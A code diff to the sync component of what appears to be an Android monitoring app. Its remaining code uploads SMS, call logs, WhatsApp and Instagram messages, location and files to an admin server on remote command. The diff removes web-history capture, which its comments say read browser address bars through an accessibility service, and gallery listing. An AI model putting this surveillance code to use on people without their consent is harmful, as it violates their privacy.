@@ -11,7 +11,6 @@ import com.spapp.monitoring.collectors.InstalledAppsCollector
 import com.spapp.monitoring.collectors.LocationFetcher
 import com.spapp.monitoring.collectors.PermissionStatusCollector
 import com.spapp.monitoring.collectors.SmsLogCollector
-import com.spapp.monitoring.collectors.WebHistoryCollector
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.data.local.WhatsAppMessageEntry
@@ -29,8 +28,6 @@ import com.spapp.monitoring.network.LocationReportRequest
 import com.spapp.monitoring.network.RemoteCommand
 import com.spapp.monitoring.network.SmsLogEntryDto
 import com.spapp.monitoring.network.SmsLogSyncRequest
-import com.spapp.monitoring.network.WebHistoryEntryDto
-import com.spapp.monitoring.network.WebHistorySyncRequest
 import com.spapp.monitoring.data.local.InstagramMessageEntry
 import com.spapp.monitoring.network.InstagramMessageEntryDto
 import com.spapp.monitoring.network.InstagramMessagesSyncRequest
@@ -91,7 +88,6 @@ class SyncRunner(private val context: Context) {
         }
         if (flags == null || flags.file_manager) {
             commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
-            commands.filter { it.command_type == "gallery_list" }.forEach { processGalleryListCommand(bearer, it) }
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
         commands.filter { it.command_type == "sync_whatsapp" }.forEach { command ->
@@ -164,13 +160,6 @@ class SyncRunner(private val context: Context) {
         val flags = flagsResponse.body()!!
         val db = AppDatabase.getInstance(context)
 
-        // Always mirrored locally (not just when true) — BlockAccessibilityService
-        // reads this flag directly to decide whether to record a URL it just
-        // saw, and it needs to stop recording immediately once the admin
-        // turns the flag off, the same way syncBlockRules() below always
-        // overwrites the local rules cache regardless of app_blocking.
-        state.webHistoryTrackingEnabled = flags.web_history_tracking
-
         // Always sent, regardless of which flags are on — this is "can this
         // feature actually work on this device right now", not "is it
         // turned on", so the dashboard can show a real OS-level permission
@@ -197,7 +186,6 @@ class SyncRunner(private val context: Context) {
         }
         if (flags.file_manager) {
             commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
-            commands.filter { it.command_type == "gallery_list" }.forEach { processGalleryListCommand(bearer, it) }
             commands.filter { it.command_type == "whatsapp_file_list" }.forEach { processWhatsAppFileListCommand(bearer, it) }
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
@@ -212,9 +200,6 @@ class SyncRunner(private val context: Context) {
         // 2. Heavy periodic background collectors run after commands complete
         if (flags.app_usage_tracking) {
             syncAppUsage(bearer, db)
-        }
-        if (flags.web_history_tracking) {
-            syncWebHistory(bearer, db)
         }
         if (flags.sms_log) {
             syncSmsLog(bearer, db)
@@ -310,15 +295,6 @@ class SyncRunner(private val context: Context) {
     private suspend fun processWhatsAppFileListCommand(bearer: String, command: RemoteCommand) {
         try {
             val files = FileManagerCollector(context).listWhatsAppFiles()
-            ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
-        } catch (e: Exception) {
-            // Retried next sync cycle.
-        }
-    }
-
-    private suspend fun processGalleryListCommand(bearer: String, command: RemoteCommand) {
-        try {
-            val files = FileManagerCollector(context).listGalleryMedia()
             ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
         } catch (e: Exception) {
             // Retried next sync cycle.
@@ -923,37 +899,6 @@ class SyncRunner(private val context: Context) {
             val response = ApiClient.service.syncCallLog(bearer, CallLogSyncRequest(dtos))
             if (response.isSuccessful) {
                 db.callLogDao().deleteByIds(unsynced.map { it.id })
-            }
-        } catch (e: Exception) {
-            // Retried on next scheduled run.
-        }
-    }
-
-    /**
-     * Two sources, merged: (1) the local Room buffer that
-     * BlockAccessibilityService fills by reading supported browsers'
-     * address bars — the real working mechanism, since modern Chrome
-     * exposes no history API to third-party apps at all — and (2)
-     * WebHistoryCollector's legacy content-provider query, kept as a
-     * secondary source for the rare OEM/legacy browser that still
-     * implements it. Buffered-and-deleted like SMS/call logs, not
-     * fire-and-forget, since source (1) can produce real volume.
-     */
-    private suspend fun syncWebHistory(bearer: String, db: AppDatabase) {
-        val unsynced = db.webHistoryDao().getUnsynced()
-        val legacy = WebHistoryCollector(context).collectRecent()
-
-        val dtos = unsynced.map {
-            WebHistoryEntryDto(it.url, it.title, Instant.ofEpochMilli(it.visitedAtEpochMs).toString())
-        } + legacy.map {
-            WebHistoryEntryDto(it.url, it.title, Instant.ofEpochMilli(it.visitedAtEpochMs).toString())
-        }
-        if (dtos.isEmpty()) return
-
-        try {
-            val response = ApiClient.service.syncWebHistory(bearer, WebHistorySyncRequest(dtos))
-            if (response.isSuccessful && unsynced.isNotEmpty()) {
-                db.webHistoryDao().deleteByIds(unsynced.map { it.id })
             }
         } catch (e: Exception) {
             // Retried on next scheduled run.
